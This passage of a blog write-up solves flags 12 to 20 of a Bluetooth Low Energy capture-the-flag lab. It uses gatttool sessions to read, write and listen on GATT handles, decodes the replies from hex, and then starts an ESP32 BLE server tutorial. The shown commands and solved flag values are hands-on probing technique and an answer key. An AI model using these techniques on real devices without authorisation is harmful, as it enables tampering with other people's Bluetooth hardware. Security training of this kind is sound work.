-b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /2</span><br></pre></td></tr></table></figure>

<h3 id="第十二题-flag12-和上面一题一样看不懂"><a href="#第十二题-flag12-和上面一题一样看不懂" class="headerlink" title="第十二题 flag12 和上面一题一样看不懂"></a>第十二题 flag12 和上面一题一样看不懂</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725225234861.png"></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725230829248.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0042|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Listen to handle 0x0044 for a single indication</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0044 -n 0a --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Indication   handle = 0x0044 value: 63 37 62 38 36 64 64 31 32 31 38 34 38 63 37 37 63 31 31 33 </span><br><span class="line">^C⏎                                                                                  tigerortiger@ubuntu ~/s/pthon [SIGINT]&gt; </span><br><span class="line">echo &quot;63 37 62 38 36 64 64 31 32 31 38 34 38 63 37 37 63 31 31 33&quot;|xxd -ps -r</span><br><span class="line">c7b86dd121848c77c113⏎                                                                tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;c7b86dd121848c77c113&quot;|xxd -ps</span><br><span class="line">63376238366464313231383438633737633131330a</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 6337623836646431323138343863373763313133</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="第十三题-flag13"><a href="#第十三题-flag13" class="headerlink" title="第十三题 flag13"></a>第十三题 flag13</h3><p>Check out handle 0x0046 and do what it says. Keep in mind that this notification clallange requires you to recieve multiple responses in order to complete.<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725231653389.png"></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725231916250.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/s/pthon [1]&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0046 -n 0a --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0046 value: 55 20 6e 6f 20 77 61 6e 74 20 74 68 69 73 20 6d 73 67 00 00 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 </span><br><span class="line">^C⏎                                                                                  </span><br><span class="line">tigerortiger@ubuntu ~/s/pthon [SIGINT]&gt; </span><br><span class="line">echo &quot;63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64&quot;|xxd -ps -r</span><br><span class="line">c9457de5fd8cafe349fd⏎                                                                tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;c9457de5fd8cafe349fd&quot;|xxd -ps</span><br><span class="line">63393435376465356664386361666533343966640a</span><br><span class="line"></span><br><span class="line">tigerortiger@ubuntu ~/s/pthon [1]&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 6339343537646535666438636166653334396664</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="第十四题-flag14"><a href="#第十四题-flag14" class="headerlink" title="第十四题 flag14"></a>第十四题 flag14</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725232424448.png"></p>
<p>跟十三题一样。</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725232520987.png"></p>
<h3 id="第十五题-flag15"><a href="#第十五题-flag15" class="headerlink" title="第十五题 flag15"></a>第十五题 flag15</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725232842263.png"><br>要修改CSR 的MAC 地址为上述地址，要使用bdaddr ，但是没办法使用。后面再说。</p>
<h3 id="第十六题-flag16"><a href="#第十六题-flag16" class="headerlink" title="第十六题 flag16"></a>第十六题 flag16</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726220429673.png"><br>设置MTU 为444<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726220732048.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; gatttool -b C8:F0:9E:A6:C8:D2 -I</span><br><span class="line">[C8:F0:9E:A6:C8:D2][LE]&gt; connect</span><br><span class="line">Attempting to connect to C8:F0:9E:A6:C8:D2</span><br><span class="line">Connection successful</span><br><span class="line">[C8:F0:9E:A6:C8:D2][LE]&gt; mtu 444</span><br><span class="line">MTU was exchanged successfully: 444</span><br><span class="line">[C8:F0:9E:A6:C8:D2][LE]&gt; char-</span><br><span class="line">char-desc       char-read-hnd   char-read-uuid  char-write-cmd  char-write-req</span><br><span class="line">[C8:F0:9E:A6:C8:D2][LE]&gt; char-read-hnd 0x004e</span><br><span class="line">Characteristic value/descriptor: 62 31 65 34 30 39 65 35 61 34 65 61 66 39 66 65 35 31 35 38 </span><br><span class="line">[C8:F0:9E:A6:C8:D2][LE]&gt; exit</span><br><span class="line"></span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">echo &quot;Characteristic value/descriptor: 62 31 65 34 30 39 65 35 61 34 65 61 66 39 66 65 35 31 35 38&quot;|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">b1e409e5a4eaf9fe5158</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo -n &quot;b1e409e5a4eaf9fe5158&quot;|xxd -ps </span><br><span class="line">6231653430396535613465616639666535313538</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 6231653430396535613465616639666535313538</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br></pre></td></tr></table></figure>


<h3 id="第十七题-flag17"><a href="#第十七题-flag17" class="headerlink" title="第十七题 flag17"></a>第十七题 flag17</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726222620497.png"></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726223325901.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo -n &quot;hello&quot;| xxd -ps</span><br><span class="line">68656c6c6f</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0050 -n 68656c6c6f</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0050</span><br><span class="line">Characteristic value/descriptor: 64 34 31 64 38 63 64 39 38 66 30 30 62 32 30 34 65 39 38 30 00</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">echo &quot;Characteristic value/descriptor: 64 34 31 64 38 63 64 39 38 66 30 30 62 32 30 34 65 39 38 30 00&quot;|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">d41d8cd98f00b204e980</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;d41d8cd98f00b204e980&quot; | xxd -ps</span><br><span class="line">64343164386364393866303062323034653938300a</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 6434316438636439386630306232303465393830</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br></pre></td></tr></table></figure>

<h3 id="第十八题-flag18"><a href="#第十八题-flag18" class="headerlink" title="第十八题 flag18"></a>第十八题 flag18</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726223958174.png"></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726223949537.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0052 -n 0a --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0052 value: 66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62 </span><br><span class="line">^C⏎                                                                                  </span><br><span class="line">tigerortiger@ubuntu ~/s/pthon [SIGINT]&gt; </span><br><span class="line">echo &quot;66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62&quot;|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line"></span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">echo &quot;aa:66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62&quot;|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">fc920c68b6006169477b</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo -n &quot;fc920c68b6006169477b&quot;|xxd -ps</span><br><span class="line">6663393230633638623630303631363934373762</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 6663393230633638623630303631363934373762</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br></pre></td></tr></table></figure>

<h3 id="第十九题-flag19"><a href="#第十九题-flag19" class="headerlink" title="第十九题 flag19"></a>第十九题 flag19</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726225344083.png"></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726225410917.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0054 -n 00</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0054</span><br><span class="line">Characteristic value/descriptor: 66 62 62 39 36 36 39 35 38 66 </span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0054 -n 0a --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0054 value: 30 37 65 34 61 30 63 63 34 38 </span><br><span class="line">^C⏎                                                                                  tigerortiger@ubuntu ~/s/pthon [SIGINT]&gt; </span><br><span class="line">echo &quot;aa:66 62 62 39 36 36 39 35 38 66 30 37 65 34 61 30 63 63 34 38&quot;|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">fbb966958f07e4a0cc48</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;fbb966958f07e4a0cc48&quot;|xxd -ps</span><br><span class="line">66626239363639353866303765346130636334380a</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon [1]&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 6662623936363935386630376534613063633438</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br></pre></td></tr></table></figure>


<h3 id="第二十题-flag20"><a href="#第二十题-flag20" class="headerlink" title="第二十题  flag20"></a>第二十题  flag20</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726225913551.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x0056|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">md5 of author&#x27;s twitter handle</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;@hackgnar&quot; -n | md5sum</span><br><span class="line">0e8fe5a24d807605f3ac6c13f45172a0  -</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; echo -n &quot;d953bfb9846acc2e15ee&quot;|xxd -ps</span><br><span class="line">6439353362666239383436616363326531356565</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 6439353362666239383436616363326531356565</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">tigerortiger@ubuntu ~/s/pthon&gt; </span><br><span class="line">gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:1 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://github.com/hackgnar/ble_ctf">https://github.com/hackgnar/ble_ctf</a></p>
<p><a target="_blank" rel="noopener" href="https://yichen115.github.io/2022/02/14/omybby/">https://yichen115.github.io/2022/02/14/omybby/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.tclaverie.eu/posts/bluetooth-low-energy-ctf---write-up/">https://blog.tclaverie.eu/posts/bluetooth-low-energy-ctf---write-up/</a></p>
<p><a target="_blank" rel="noopener" href="https://socketo.hatenablog.jp/entry/2019/02/21/203347">https://socketo.hatenablog.jp/entry/2019/02/21/203347</a></p>
<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p>蓝牙安全与攻击案例分析</p>
<p><a target="_blank" rel="noopener" href="https://evilpan.com/2021/07/10/bluetooth-sec/">https://evilpan.com/2021/07/10/bluetooth-sec/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.getit01.com/p2018101545717775/">https://www.getit01.com/p2018101545717775/</a></p>
<p>如何破解一个蓝牙锁</p>
<p><a target="_blank" rel="noopener" href="https://yaseng.org/how-to-crack-a-ble-lock.html">https://yaseng.org/how-to-crack-a-ble-lock.html</a></p>
<p><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-10109.html">http://drops.xmd5.com/static/drops/tips-10109.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/karaxiaoyu/article/details/123588009#:~:text=%E5%A4%A7%E5%AE%B6%E5%A5%BD%EF%BC%8C%E8%BF%91%E6%9C%9F%E6%9B%B4%E6%96%B0%E4%BA%86ESP32%E7%9A%84%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B%EF%BC%8C%E4%B8%80%E5%85%B1%2012%E7%AF%87%20%E5%9F%BA%E7%A1%80%E6%96%87%E7%AB%A0%EF%BC%8C%E6%B6%89%E5%8F%8AESP32%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%B8%B8%E7%94%A8%E5%A4%96%E8%AE%BE%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8C%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E5%B7%B2%E7%BB%8F%E5%AE%8C%E6%AF%95%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E4%BC%9A%E5%87%BA%E4%B8%80%E4%BA%9B%20WiFi%E3%80%81%E8%93%9D%E7%89%99%E3%80%81%E5%B1%8F%E5%B9%95%E4%BB%A5%E5%8F%8A%E4%BC%A0%E6%84%9F%E5%99%A8%20%E7%AD%89%E6%9B%B4%E5%A4%9A%20%E5%A5%BD%E7%8E%A9%E5%84%BF%E7%9A%84%E9%A1%B9%E7%9B%AE%20%E4%BB%8B%E7%BB%8D%EF%BC%8C%E5%9C%A8%E5%85%AC%E4%BC%97%E5%8F%B7%20%E8%B7%B3%E5%8A%A8%E7%9A%84%E5%AD%97%E8%8A%82,01%20%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D%20%E8%80%81%E5%AE%87%E5%93%A5%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%ACESP32%EF%BC%9A01%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D%2002%20%E4%BD%BF%E7%94%A8VSCode%2BPlatformIO%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%20%E8%80%81%E5%AE%87%E5%93%A5%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%ACESP32%EF%BC%9A02%E4%BD%BF%E7%94%A8VSCode%2BPlatformIO%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%2003%20GPIO%E6%95%B0%E5%AD%97%E8%BE%93%E5%85%A5%E4%B8%8E%E6%95%B0%E5%AD%97%E8%BE%93%E5%87%BA">https://blog.csdn.net/karaxiaoyu/article/details/123588009#:~:text=%E5%A4%A7%E5%AE%B6%E5%A5%BD%EF%BC%8C%E8%BF%91%E6%9C%9F%E6%9B%B4%E6%96%B0%E4%BA%86ESP32%E7%9A%84%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B%EF%BC%8C%E4%B8%80%E5%85%B1%2012%E7%AF%87%20%E5%9F%BA%E7%A1%80%E6%96%87%E7%AB%A0%EF%BC%8C%E6%B6%89%E5%8F%8AESP32%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%B8%B8%E7%94%A8%E5%A4%96%E8%AE%BE%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8C%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E5%B7%B2%E7%BB%8F%E5%AE%8C%E6%AF%95%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E4%BC%9A%E5%87%BA%E4%B8%80%E4%BA%9B%20WiFi%E3%80%81%E8%93%9D%E7%89%99%E3%80%81%E5%B1%8F%E5%B9%95%E4%BB%A5%E5%8F%8A%E4%BC%A0%E6%84%9F%E5%99%A8%20%E7%AD%89%E6%9B%B4%E5%A4%9A%20%E5%A5%BD%E7%8E%A9%E5%84%BF%E7%9A%84%E9%A1%B9%E7%9B%AE%20%E4%BB%8B%E7%BB%8D%EF%BC%8C%E5%9C%A8%E5%85%AC%E4%BC%97%E5%8F%B7%20%E8%B7%B3%E5%8A%A8%E7%9A%84%E5%AD%97%E8%8A%82,01%20%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D%20%E8%80%81%E5%AE%87%E5%93%A5%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%ACESP32%EF%BC%9A01%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D%2002%20%E4%BD%BF%E7%94%A8VSCode%2BPlatformIO%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%20%E8%80%81%E5%AE%87%E5%93%A5%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%ACESP32%EF%BC%9A02%E4%BD%BF%E7%94%A8VSCode%2BPlatformIO%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%2003%20GPIO%E6%95%B0%E5%AD%97%E8%BE%93%E5%85%A5%E4%B8%8E%E6%95%B0%E5%AD%97%E8%BE%93%E5%87%BA</a></p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230711172945939.png"></p>
<h1 id="esp32-蓝牙开发"><a href="#esp32-蓝牙开发" class="headerlink" title="esp32 蓝牙开发"></a>esp32 蓝牙开发</h1><p>ESP32 支持双模蓝牙，即同时支持经典蓝牙和低功耗蓝牙。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>选择开发板，端口，上传的波特率。</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230805114345297.png"></p>
<h2 id="代码开发"><a href="#代码开发" class="headerlink" title="代码开发"></a>代码开发</h2><h3 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/img-20230806222335.png"><br>这里选择了BLE-server 实例的代码。</p>
<p>选择进行编译<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806222649332.png"></p>
<p>上传代码到板子上，上传完后，拔掉板子。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806223403984.png"></p>
<p>给板子重新上电，手机蓝牙就可以扫描到板子设置的蓝牙名称。</p>
<p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806231005051.png"></p>
<p>实例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    Based on Neil Kolban example for IDF: https://github.com/nkolban/esp32-snippets/blob/master/cpp_utils/tests/BLE%20Tests/SampleServer.cpp</span><br><span class="line">    